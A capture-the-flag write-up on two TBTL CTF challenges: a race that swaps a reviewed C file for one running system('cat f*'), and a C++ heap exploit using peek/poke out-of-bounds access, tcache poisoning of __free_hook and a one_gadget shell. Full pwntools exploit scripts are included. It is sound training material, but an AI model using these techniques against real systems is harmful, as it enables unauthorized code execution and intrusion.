# TBTL CTF

{% hint style="info" %}
Participated under the banner of <mark style="color:blue;">**HCS**</mark>, ranked <mark style="color:yellow;">20</mark> out of <mark style="color:yellow;">792</mark> teams.
{% endhint %}

<table><thead><tr><th width="206">Challenge</th><th width="309">Category</th><th width="124" align="center">Points</th><th align="center">Solves</th></tr></thead><tbody><tr><td>A Day at the Races</td><td>Binary Exploitation</td><td align="center">100 pts</td><td align="center">35</td></tr><tr><td>Heap Peek and Poke</td><td>Binary Exploitation</td><td align="center">469 pts</td><td align="center">8</td></tr></tbody></table>

## A Day at the Races

### Description

> May the fastest code win! Just make sure you get a green light from the security team before racing.
>
> &#x20;`nc 0.cloud.chals.io 10840`

### Analysis

we're given the following files

```bash
└──╼ [★]$ tree .
.
├── fibonacci.c
├── flag.txt
├── primes.c
└── server.py
```

`server.py` is the what will handle our connection.

```python
def main():
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(300)

    slow_print("Let's see what kind of time your C program clocks today!\n")
    slow_print("Enter filename: ")
    filename = input()
    check_filename(filename)
    filepath = "./run/" + filename

    slow_print("Enter contents (base64): ")
    contents = input()
    try:
        data = base64.decode(io.StringIO(contents), open(filepath, 'wb'))
    except Exception as e:
        error("Error decoding contents ({}).\n".format(e))

    check_compile_and_run(filepath)
    slow_print("Bye!\n")
```

the server takes two input, a filename and it's content in base64.&#x20;

notice how the program does a slow print, instead of the regular ones using `slow_print()` which is a custom function as follows:

```python
def slow_print(s, baud_rate=0.1):    
    for letter in s:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(baud_rate)
```

what's relevant next is what how's the file content is being processed. we can take a look at this in `check_compile_and_run()`

```python
REVIEWED_SOURCES = [
    "24bf297fff03c69f94e40da9ae9b39128c46b7fe", # fibonacci.c
    "55c53ce7bc99001f12027b9ebad14de0538f6a30", # primes.c
]

def check_compile_and_run(source_path):
    slow_print("Checking if the program is safe {} ...\n".format(source_path))
    hash = hashlib.sha1(open(source_path, 'rb').read()).hexdigest()
    print(f"{source_path}:{hash}")
    if not hash in REVIEWED_SOURCES:
        error("The program you uploaded has not been reviewed yet.")
    exe_path = source_path + ".exe"
    slow_print("Compiling {} ...\n".format(source_path))
    subprocess.check_call(["/usr/bin/gcc", "-o", exe_path, source_path])
    slow_print("Running {} ...\n".format(exe_path))
    time_start = time.time()
    subprocess.check_call(exe_path)
    duration = time.time()-time_start
    slow_print("Duration {} s\n".format(duration))
```

the function will check for the shasum of the content that we gave earlier. which mean it will only allows for anything that has the same content as `fibonacci.c` and `primes.c`

{% hint style="info" %}
both `fibonacci.c` and `primes.c` contains normal code and provide as a test case for what the intended functionality of the server is.
{% endhint %}

if everything passes the check, it will then compile and execute our code using _**gcc**_.&#x20;

### Exploitation

the problem here is the `slow_print()` as it makes executing one line of code takes quite a bit of time.&#x20;

such that say if we provide the server with a valid file content, and reaching this part

```python
 slow_print("Compiling {} ...\n".format(source_path))
```

it will take its time printing the text bit by bit before actually compiling the and running the executable. within that timeframe we can make another connection rewriting the valid content with malicious one and eventually when that line of code is done, it will instead compile the malicious content and running it.

first we will have two connection to the server, giving the same filename.

```python
ioval = initialize()
ioval.sendlineafter(b': ', b'hygge.c')

iomal = initialize()
iomal.sendlineafter(b': ', b'hygge.c')
```

then we will give the valid content and wait for the compile message

```python
payloadval = b64encode(open('primes.c', 'rb').read())
ioval.sendlineafter(b': ', payloadval)
ioval.recvuntil(b'Compiling')
```

then when it reaches up to that point, it will already passes the check, which means our other connection can overwrite it and close it to avoid any further error&#x20;

```python
ioval.sendlineafter(b': ', payloadval)
iomal.sendlineafter(b': ', payloadmal)
iomal.recvuntil(b'safe')
```

as for the malicious content, it will be a simple cat to the flag

```c
#include<stdlib.h>
#include<stdio.h>

int main(){
    char a;
    a = system("cat f*");
    printf("%s",a);
}
```

run it againts the server

<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

below is the full exploit:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *
from base64 import b64encode
import asyncio

# =========================================================
#                          SETUP                         
# =========================================================
exe = './server.py'
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '0.cloud.chals.io', 10840

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    ioval = initialize()
    ioval.sendlineafter(b': ', b'hygge.c')

    iomal = initialize()
    iomal.sendlineafter(b': ', b'hygge.c')

    payloadval = b64encode(open('primes.c', 'rb').read())
    ioval.sendlineafter(b': ', payloadval)

    payloadmal = b64encode(open('expl.c', 'rb').read())

    ioval.recvuntil(b'Compiling')
    iomal.sendlineafter(b': ', payloadmal)

    iomal.recvuntil(b'safe')
    iomal.close()
    
    ioval.interactive()

if __name__ == '__main__':
    exploit()
```
{% endcode %}

{% code title="expl.c" %}
```c
#include<stdlib.h>
#include<stdio.h>

int main(){
    char a;
    a = system("cat f*");
    printf("%s",a);
}
```
{% endcode %}

{% hint style="success" %}
Flag: _TBTL{T1m3\_0f\_chEck\_70\_tIM3\_0f\_PWN}_
{% endhint %}

## Heap Peek and Poke

### Description

> Last year's solutions were unintended, let's try it again.
>
> &#x20;`nc 0.cloud.chals.io 12348`

{% hint style="info" %}
my first CPP heap exploitation challenge
{% endhint %}

### Analysis

here's what we're given

```bash
└──╼ [★]$ tree .
.
├── chall
├── chall.cpp
├── flag.txt
├── libc-2.27.so
├── libstdc++.so.6

└──╼ [★]$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=387e8e6d3dcde6bd62fea53786bca1072d7d3181, not stripped

└──╼ [★]$ pwn checksec chall
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

it's a C++ pwn challenge, which is I'm very unfamiliar. thankfully they gave us the source code, cause reversing C++ is a pain.

first thing first, here's a win function:

```cpp
void win() {
  ifstream in("flag.txt");
  string flag;
  in >> flag;
  cout << flag << endl;
}
```

interacting with the binary it asks for a string followed by pre defined commands.

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

here's the commands available as well some help to use it

```cpp
using namespace std;

const string ENTER_PROMPT("Enter a string:");
const string COMMAND_PROMPT("Enter command:");
const string PEEK_CMD("peek");
const string POKE_CMD("poke");
const string QUIT_CMD("quit");
const string BYE_MSG("Bye bye!");
const string UNKNOWN_CMD("Unknown command!");
const map<string, string> HELP {
  {PEEK_CMD, string("peek <integer a>: gets the ascii value of character at index a")},
  {POKE_CMD, string("poke <integer a> <integer b>: changes character at index a to ascii value b")}
};
```

the main function is not necessarily lengthy but coming from someone who does little to no interaction with C++, it can take some time to understand, so I'll explain it piece by piece.

```cpp
int main() {
  cout.setf(ios::unitbuf);
  cout << ENTER_PROMPT << endl;
  string s;
  getline(cin, s);
  if (s.size() < 0x20)
    return 0;
  // ....
```

first, it will prompt for an input and store it in `string s`, the string must not less than `0x20`.

it then goes for a infinite loop and prompt for a command

```cpp
  while (true) {
    cout << COMMAND_PROMPT << endl;
    string line;
    getline(cin, line);
    istringstream iss(line);
    string command;
    iss >> command;
```

we all know string, but what is `istringstream` ?

basically something like tokenization or `strtok()` in C. an `>>` operator will take the string up until a whitespace that the stream is initialized.&#x20;

so for example if line contains the string `"INPUT SAMPLE"`, then after `iss >> command` , command will contain the string `"INPUT"`

next it will compare our input to the defined commands.

```cpp
    if (command == POKE_CMD) {
      int x, y;
      if (!(iss >> x >> y)) {
        cout << HELP.at(POKE_CMD) << endl;
        continue ;
      }
      s[x] = char(y);
    } 
```

first command is `poke x y`, poke will change our input string at any given index with any byte.

```cpp
    } else if (command == PEEK_CMD) {
      int x;
      if (!(iss >> x)) {
        cout << HELP.at(PEEK_CMD) << endl;
        continue ;
      }
      cout << int(s[x]) << endl;
    }
```

`peek x`, peek reads a byte and print it out as integer.

then other than that we'll just quit the program

```cpp
    } else if (command == QUIT_CMD) {
      cout << BYE_MSG << endl;
      break ;
    } else {
      cout << UNKNOWN_CMD << endl;
      continue ;
    }
```

so in summary:

* We gave the program a string of length bigger than 0x20
* `poke x y` to write byte x to offset y relative to the string address
* `peek x` to read a byte at offset x relative to the string address

### Exploitation

{% hint style="info" %}
recap:

* arbitrary read only on heap region
* arbitrary write only on heap region&#x20;
{% endhint %}

So I know string can have dynamic length and intuitively can't be stored in the stack so it must use the heap. I verify this by giving a long string and a short string then comparing the heap for both of it.

here's where I gave a long string:

<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

and here's when I gave a short one:

<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

so we do have some sort of indirect control to the heap. However unlike the typical CRUD heap challenge, we can't decide when or what will be allocated and free'd. we can only interact with the heap through the `std::string` API.&#x20;

so I look up for resources and found these:

* [https://gist.github.com/saelo/0c77ce6c2b84af70644d81802892c289](https://gist.github.com/saelo/0c77ce6c2b84af70644d81802892c289)
* [https://github.com/LevitatingLion/ctf-writeups/blob/master/defcon\_quals\_2018/pwn\_124\_its\_a\_me/README.md](https://github.com/LevitatingLion/ctf-writeups/blob/master/defcon_quals_2018/pwn_124_its_a_me/README.md)
* [https://www.slideshare.net/slideshow/pwning-in-c-basic/58370781](https://www.slideshare.net/slideshow/pwning-in-c-basic/58370781)
* [https://fail0verflow.com/blog/2014/plaidctf2014-web800-bronies/](https://fail0verflow.com/blog/2014/plaidctf2014-web800-bronies/)

the readings doesn't provide me with a definitive answer, but it provide me with quite enough information so that I didn't go as blind in exploiting this.

okay so, first I gave the program enough string to initialize and locate its the `s` heap chunk

```python
io.sendlineafter(b'string:', cyclic(0x20))
```

<figure><img src="../../.gitbook/assets/image (78).png" alt="" width="281"><figcaption></figcaption></figure>

and notice conveniently there's a free chunk right after, we can read at any offset and leak the heap's address. since we can only read one byte at a time, I wrote this poorly written function that allows us to read 8 byte from an offset

```python
def read(idx) -> str:
    ret = []

    for i in range(8):
        io.sendlineafter(b'command:', f'peek {idx+i}'.encode())
        io.recvline()
        res = int(io.recvline().strip())
        if res < 0:
            res = struct.pack('>l', res)[-1]
        res = hex(res)
        res = res.replace('0x', '').replace('-', '')
        if len(res) == 1:
            res = '0' + res
        ret.append(res)
    
    return ''.join([x[::-1] for x in ret])[::-1]
```

calculate its offset from GDB we then can leak it and calculate its offset again to get our read's base address ( i.e the address where our string is located, since every offset will be relative from it )

```python
heap = int(read(0x58), 16) + 0x11e70 + 0x10
log.success('heap: %#x', heap)
```

next thing that came into my mind is that since libc is 2.27, the hooks are still within the library so we can hijack it, but how we have no control over what chunks are allocated and free'd.&#x20;

I did try to look at the decompiled version binary and notice a `deconstructor` called on one or mote of the string variables

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

I did put breakpoints on this calls in GDB and observe the heap condition to find out that these do not have any behaviour on the chunks. so we all learn something at the end.

at this point I notice when giving a quite huge string as I shown above, I noticed that the there are bins that contain more than 1 chunk. and this happens as we provide the input, and so I think if our input goes through it and have some sort of control to the chunk's data?&#x20;

turns out it does as shown below

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

so the subsequent chunks contain the string we gave, this behaviour is well explained in the links I provided above. In short, in order for the string length to be dynamic, it will create a larger memory  for it to store in case it has reached the current memory capacity of the string.

from this we potentially can do tcache poisoning to allocate a chunk into the hooks. &#x20;

the size of the bin that has a double chunk depends on the size of our input, so I banter and fuzz a little bit more to find the ideal size (this will be important later)

I find 0x20 to be good&#x20;

```python
io.sendlineafter(b'string:', cyclic(0x20))
heap = int(read(0x58), 16) + 0x11e70 + 0x10

# important
io.sendlineafter(b'command:', cyclic(0x20))
```

and this is our heap state up to this point.

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

next let's get a libc leak by giving it a huge string&#x20;

```python
io.sendlineafter(b'command:', cyclic(0x400))
```

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

calculate the offset of our `s` chunk to the unsorted bin chunk in GDB, and use read to gain libc address

```python
libc.address = int(read(0x1e60), 16) - 0x3ebca0
log.success('libc: %#x', libc.address)
```

next, we will overwrite the fd pointer to `__free_hook` to do tcache poisoning. the offset to the chunks are obtained within GDB.

since we can only write one byte at a time, I've wrote this another wrapper function that handles an 8 byte write&#x20;

```python
def write(idx, val):
    for i in range(8):
        io.sendlineafter(b'command:', f'poke {idx+i} {val[i]}'.encode())
```

and now what's important is that we can't directly overwrite it to `__free_hook`, this is because  the chunks are only allocated only if it needed to do so (i.e. if our input is large enough).&#x20;

means if we gave the program small input (as what we will do it if we were to overwrite it with `__free_hook` directly), it will not need to allocate memory and thus the poisoning will not be triggered.&#x20;

overwriting it directly and giving a large input will also not work since the function address we wanna write to `__free_hook`, will have null bytes thus terminating the string and end up in a small input.&#x20;

so let's fuzz at how large of an input that it the start to affect chunk in the bin. let's try with a small one to verify our thoughts

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

as you can see, the chunk doesn't contain our new input, lets try a little bigger one at 0x18

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

and now those chunks contain our new input. so we will need to poison the fd with `__free_hook` - 0x10. ( offset to the chunks are obtained within GDB )&#x20;

```python
write(0x1660, (libc.sym['__free_hook'] - 0x10).to_bytes(8, 'little'))
```

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

and we can further verify the idea by giving a command and see if we are actually able to write to it

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

and we do, great !

this is earlier we gave the a relatively small amount of string to the program, this is to create and link two chunk inside of an 0x30 tcache.&#x20;

```python
# important
io.sendlineafter(b'command:', cyclic(0x20))
```

if we were to put it into an bigger size tcache, this would prove to be complicated since we would also need to overwrite more values that came before  `__free_hook`. which can crash the program&#x20;

anyway, so what function do we wanna call? there's a win function right? well recall that the program has PIE, and we have no leaks to gain the base address.&#x20;

I found this [post](https://blog.osiris.cyber.nyu.edu/2019/04/06/pivoting-around-memory/) which explains clearly how we can pivot around memory to get leaks, but in the end its too much work and why don't we try `system()`&#x20;

```python
payload = cyclic(0x10) + p64(libc.sym['system'])
io.sendlineafter(b'command:', payload)
```

<figure><img src="../../.gitbook/assets/image (90).png" alt="" width="563"><figcaption></figcaption></figure>

welp, that fails because free is immediately called when we gave the input. notice that the string bash try execute is our payload padding. we can't also just pad it with `/bin/sh` because of null bytes. so let's try `one_gadgets`.

```python
one_gadgets = [0x4f2a5, 0x4f302, 0x10a2fc]
payload = cyclic(0x10) + p64(libc.address + one_gadgets[1])
io.sendlineafter(b'command:', payload)
```

<figure><img src="../../.gitbook/assets/image (91).png" alt="" width="563"><figcaption></figcaption></figure>

and it works! but ... fails remotely&#x20;

turns out the remote server has different offsets, since the organizer has no discord and they only way to contact is through email, I opted to just fuzz the server&#x20;

```python
for i in range(0x0, 0x3000, 0x8):
    leak = int(read(i), 16)
    log.success('leak[%#x]: %#x', i, leak)
```

{% hint style="info" %}
remember to fuzz at the correct stage of the exploit as different stages will have different heap state thus resulting in a different offset as well.
{% endhint %}

with trials and error, I found the correct offset and got the flag!

<figure><img src="../../.gitbook/assets/image (92).png" alt="" width="521"><figcaption></figcaption></figure>

here's the full exploit:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc-2.27.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '0.cloud.chals.io', 12348

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *main+99
# break *main+419
# break *main+862
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def read(idx) -> str:
    ret = []

    for i in range(8):
        io.sendlineafter(b'command:', f'peek {idx+i}'.encode())
        io.recvline()
        res = int(io.recvline().strip())
        if res < 0:
            res = struct.pack('>l', res)[-1]
        res = hex(res)
        res = res.replace('0x', '').replace('-', '')
        if len(res) == 1:
            res = '0' + res
        ret.append(res)
    
    return ''.join([x[::-1] for x in ret])[::-1]

def write(idx, val):
    for i in range(8):
        io.sendlineafter(b'command:', f'poke {idx+i} {val[i]}'.encode())

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'string:', cyclic(0x20))
    heap = int(read(0x58), 16) + 0x11e70 + 0x10

    # important
    io.sendlineafter(b'command:', cyclic(0x20))

    log.info('allocating large string')
    io.sendlineafter(b'command:', cyclic(0x400))

    # fuzz remote
    # for i in range(0x2a38, 0x3000, 0x8):
    #     leak = int(read(i), 16)
    #     log.success('leak[%#x]: %#x', i, leak)
    
    # libc.address = int(read(0x1e60), 16) - 0x3ebca0 # local
    libc.address = int(read(0x2a60), 16) - 0x3ebca0 # remote

    # write(0x1660, (libc.sym['__free_hook'] - 0x10).to_bytes(8, 'little')) # local
    write(0x2260, (libc.sym['__free_hook'] - 0x10).to_bytes(8, 'little'))  # remote

    # fuzz remote
    # for i in range(0x1000, 0x1700, 0x8): 
    #     leak = int(read(i), 16)
    #     log.success('leak[%#x]: %#x', i, leak)

    one_gadgets = [0x4f2a5, 0x4f302, 0x10a2fc]
    # payload = cyclic(0x10) + p64(libc.sym['system'])
    payload = cyclic(0x10) + p64(libc.address + one_gadgets[1])
    io.sendlineafter(b'command:', payload)

    sleep(2)
    io.sendline('cat flag*')   

    log.success('heap: %#x', heap)
    log.success('libc: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
```
{% endcode %}

{% hint style="success" %}
Flag: _TBTL{uN1n73nDED\_20Lu720nS\_4R3\_4wl4y2\_W3LCOm3}_
{% endhint %}
